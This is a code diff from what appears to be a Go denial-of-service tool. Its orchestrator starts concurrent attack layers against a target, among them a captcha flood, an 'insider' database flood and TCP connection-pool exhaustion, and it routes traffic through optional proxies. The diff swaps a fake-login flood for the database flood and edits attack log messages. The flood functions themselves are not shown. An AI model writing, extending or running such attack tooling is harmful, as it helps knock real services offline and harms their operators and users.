@@ -47,12 +47,10 @@ func NewOrchestrator(
 
 	if !useProxy {
 		proxyMgr.enabled = false
-		log.Printf("[orch] Proxy disabled for attack %s", id)
 	} else {
 		proxyMgr.enabled = true
 	}
 
-	// Fallback smart paths if nil
 	if smartPaths == nil {
 		smartPaths = DetectSmartPaths(target.String())
 	}
@@ -95,8 +93,8 @@ func (o *Orchestrator) Start() {
 	o.stats.StartTime = time.Now()
 	o.mu.Unlock()
 
-	log.Printf("[orch] Attack %s starting against %s (proxy: %v, workers: %d)", o.id, o.target.String(), o.useProxy, o.layers.Total())
-	o.hub.BroadcastLog("success", fmt.Sprintf("Attack started: %s (Proxy: %v, Workers: %d)", o.id, o.useProxy, o.layers.Total()))
+	log.Printf("[orch] Attack %s starting against %s (workers: %d, session: %s)", o.id, o.target.String(), o.layers.Total(), o.smartPaths.SessionID)
+	o.hub.BroadcastLog("success", fmt.Sprintf("Attack started: %s (Workers: %d)", o.id, o.layers.Total()))
 	o.hub.BroadcastLog("info", "Target: "+o.target.String())
 
 	o.wg.Add(1)
@@ -112,7 +110,7 @@ func (o *Orchestrator) Start() {
 	o.wg.Add(1)
 	go o.launchLayer("L2 - Captcha Flood", o.layers.L2, layer2Recursive, timer)
 	o.wg.Add(1)
-	go o.launchLayer("L3 - Fake Login POST", o.layers.L3, layer3CacheBypass, timer)
+	go o.launchLayer("L3 - Insider DB Flood", o.layers.L3, layer3InsiderFlood, timer)
 	o.wg.Add(1)
 	go o.launchLayer("L4 - TCP Pool Exhaust", o.layers.L4, layer4PoolExhaust, timer)
 	o.wg.Add(1)
